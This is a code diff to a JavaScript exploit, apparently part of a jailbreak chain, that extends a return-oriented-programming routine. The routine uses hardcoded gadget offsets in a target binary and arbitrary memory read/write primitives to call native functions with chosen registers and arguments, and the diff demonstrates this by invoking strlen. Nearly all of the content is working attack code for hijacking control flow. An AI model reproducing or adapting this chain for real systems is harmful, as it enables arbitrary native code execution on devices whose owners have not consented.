@@ -355,7 +355,16 @@ function doExploit(buf, stale, temp) {
 		allocated[addr] = 0;
 	}
 
-	function holyrop() {
+	function holyrop(funcptr, args, registers) {
+		if (typeof(funcptr) == 'number') {
+			funcptr = add2(mainaddr, funcptr);
+		}
+		if (arguments.length == 2) {
+            registers = [];
+        } else if (arguments.length == 1) {
+            registers = [];
+            args = [];
+        } 
 		var sp = getSP();
 
 		function mref(off) { return add2(mainaddr, off); }
@@ -385,12 +394,19 @@ function doExploit(buf, stale, temp) {
 		var returngadg = mref(0x181E9C);
 
 		var savegadg = mref(0x4336B0);
+		var loadgadg = mref(0x433620);
+		var loadgadg_stage2 = mref(0x3A8688);
+
+		var ropgadg2 = mref(0x582AE8);
+		var ropgadg3 = mref(0x182444);
+		var ropgadg4 = mref(0x3A278C);
 		// End Gadgets
 
 		var context_load_struct = malloc(0x200);
 		var block_struct_1 = malloc(0x200);
 		var block_struct_2 = malloc(0x200);
 		var savearea = malloc(0x400);
+		var loadarea = malloc(0x400);
 
 		write8(context_load_struct, fixed, 0x00 >> 2);
 		write8(gadg2, fixed, 0x08 >> 2);
@@ -414,13 +430,69 @@ function doExploit(buf, stale, temp) {
 
 		sp = add2(sp, 0x30);
 
-		write8(add2(context_load_struct, 0x100), block_struct_2, 0x00 >> 2);
-		write8(gadg3, block_struct_2, 0x10 >> 2);
+		write8(loadarea, block_struct_2, 0x00 >> 2);
+		write8(loadgadg, block_struct_2, 0x10 >> 2);
+
+		write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, for argument passing
+		write8(loadgadg_stage2, loadarea, 0x100 >> 2); // Return from load to load-stage2
+		write8(funcptr, loadarea, 0x00 >> 2); 
+
+		// Write registers for native code.
+        if (registers.length > 9) {
+            for (var i = 9; i < 30 && i < registers.length; i++) {
+                write8(registers[i], loadarea, (8 * i) >> 2);
+            }
+        }
+
+        // TODO: Loading in Q0-Q7 from SP[0:0x80] here, if we want it.
+
+        if (registers.length > 0) {
+            for (var i = 0; i <= 8 && i < registers.length; i++) {
+                write8(registers[i], sp, (0x80 + 8 * i) >> 2);
+            }
+
+            if (registers.length > 19) {
+                write8(registers[19], sp, 0xC8 >> 2);
+            }
+
+            if (registers.length > 29) {
+                write8(registers[29], sp, 0xD0 >> 2);
+            }
+        }
+
+        if (args.length > 0) {
+            for (var i = 0; i < args.length && i < 8; i++) {
+                write8(args[i], sp, (0x80 + 8 * i) >> 2)
+            }
+        }
+
+		write8(ropgadg2, sp, 0xD8 >> 2); // Set Link Register for our arbitrary function to point to cleanup rop
+
+		// Stack arguments would be bottomed-out at sp + 0xE0...
+		// TODO: Stack arguments support. Would just need to figure out how much space they take up
+		// and write ROP above them. Note: the user would have to call code that actually used
+		// that many stack arguments, or shit'd crash.
+
+		write8(add2(savearea, 0xB8), sp, 0xE8 >> 2);
+		write8(ropgadg3, sp, 0xF8 >> 2);
+		write8(ropgadg4, sp, 0x118 >> 2);
+		write8(add2(sp, 0x8000), sp, 0x128 >> 2);
+		write8(ropgadg2, sp, 0x138 >> 2);
+		write8(add2(savearea, 0xF0), sp, 0x148 >> 2);
+		write8(ropgadg3, sp, 0x158 >> 2);
+		write8(ropgadg4, sp, 0x178 >> 2);
+		write8(returngadg, sp, 0x188 >> 2);
+		write8(ropgadg2, sp, 0x198 >> 2);
+		write8(add2(savearea, 0xF8), sp, 0x1A8 >> 2);
+		write8(ropgadg3, sp, 0x1B8 >> 2);
+		write8(ropgadg4, sp, 0x1D8 >> 2);
+		write8(savearea, sp, 0x1E8 >> 2);
+		write8(loadgadg, sp, 0x1F8 >> 2);
 
 		sp = add2(sp, 0x8000);
 
 		log('Assigned.  Jumping.');
-		var ret = func.apply(0x101);
+		var ret = getAddr(func.apply(0x101));
 		log('Jumped back.');
 
 		write8(curptr, funcaddr, 8);
@@ -431,23 +503,32 @@ function doExploit(buf, stale, temp) {
 			write4(saved[i], fixed, i);
 		log('Restored data page.');
 
+		log('Native code at ' + paddr(funcptr) + ' returned: ' + paddr(ret));
+		return ret;
 
+	}
 
-		if (read8(savearea, 0x30))
-		for (var i = 0; i <= 8 * 30; i += 8) {
-			log('X' + (i / 8).toString() + ': ' + paddr(read8(savearea, i >> 2)));
+	// Example: Call strlen on a string.
+	var strlen_fptr = add2(mainaddr, 0x43A6E8);
+	var strbuf = malloc(0x100);
+	var str = 'this is a test string of length 0x25!';
+
+	// Shitty memcpy of the string into buffer
+	for (var i = 0; i < 0x100 && i < str.length; i += 4) {
+		var val = 0;
+		for (var j = 0; j < 4 && i + j < str.length; j++) {
+			val |= (str.charCodeAt(i+j) & 0xFF) << (8 * j);
 		}
+		write4(val, strbuf, i >> 2);
+	}
+	if (str.length % 4 == 0) {
+		write4(0, strbuf, str.length >> 2);
 	}
 
-	holyrop();
+
+	holyrop(strlen_fptr, [strbuf]);
+	free(strbuf);
 	return;
-
-	function callNative(addr) {
-		var sp = getSP();
-		log('Setting up stack at SP ' + paddr(sp));
-	}
-
-	callNative(add2(mainaddr, 0x433744));
 }
 
 function doItAll() {
